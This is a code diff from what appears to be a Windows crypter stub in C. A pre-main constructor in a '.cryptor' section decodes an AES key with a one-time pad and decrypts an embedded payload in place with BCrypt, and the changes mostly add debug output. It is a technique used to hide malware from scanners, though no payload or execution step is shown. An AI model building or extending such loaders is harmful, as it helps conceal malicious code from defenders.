@@ -41,6 +41,10 @@ BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
  */
 __attribute__((constructor(101), section(".cryptor"))) int construct()
 {
+	/*for (int x = 0; x < 512; x++)
+	{
+		printf ("wtf");
+	}*/
 	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
 	CIPKIE2 CryptImportPublicKeyInfoEx2;
 	HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
@@ -242,7 +246,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	{
 		exit(-1);
 	} 
-	
+
 	for( int x = 0 ; x<AESKEYLEN ; x++)
 	{	
 		*(key+x)^=*(OTP+x);
@@ -278,7 +282,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	 */
 	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
 	{
-		printf ("failed to set the chaining mode to OFB");
+		printf ("failed to set the chaining mode to CFB");
 		exit(-1);
 	}
 	if(BCryptGenerateSymmetricKey(decryptPayloadKeyAlg,&decryptPayloadKey, 0,0,(PUCHAR)key,AESKEYLEN,0) != STATUS_SUCCESS)
@@ -289,23 +293,35 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	
 	payload_size = addr_e-addr_s;
 	ptr_payload = (BYTE*)addr_s;
-/*	for(int x = 0; x<payload_size; x++)
-	{
-		printf("%02x ", *(ptr_payload+x));
+	printf("size: %x\naddress: %p\ndecodedIV: %p", payload_size,ptr_payload,decodedIV );
+
+	printf("\n");
+	
+	/*{
+		BYTE* tempIV = malloc(AESKEYLEN);
+		memcpy(tempIV, decodedIV,AESKEYLEN);
+		if(BCryptEncrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,tempIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
+		{	
+			printf("failed to decrypt payload");
+			exit(-1);
+		}
 	}
-*/	
+	
+	payload_size = addr_e-addr_s;
+	ptr_payload = (BYTE*)addr_s;
+	printf("size: %x\naddress: %p", payload_size,ptr_payload);
+*/
 	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
 	{
 			printf("failed to decrypt payload");
 		exit(-1);
-	}
-			
-	payload_size = addr_e-addr_s;
-	ptr_payload = (BYTE*)addr_s;
-	for(int x = 0; x<payload_size; x++)
+	}	
+	printf("\n");
+	for(int x = 0 ; x < payload_size; x++)
 	{
 		printf("%02x ", *(ptr_payload+x));
 	}
+	printf("\n");
 	//if(BCryptDeriveKey
 	/** TODO
 	 *  DECYPT PAYLOAD
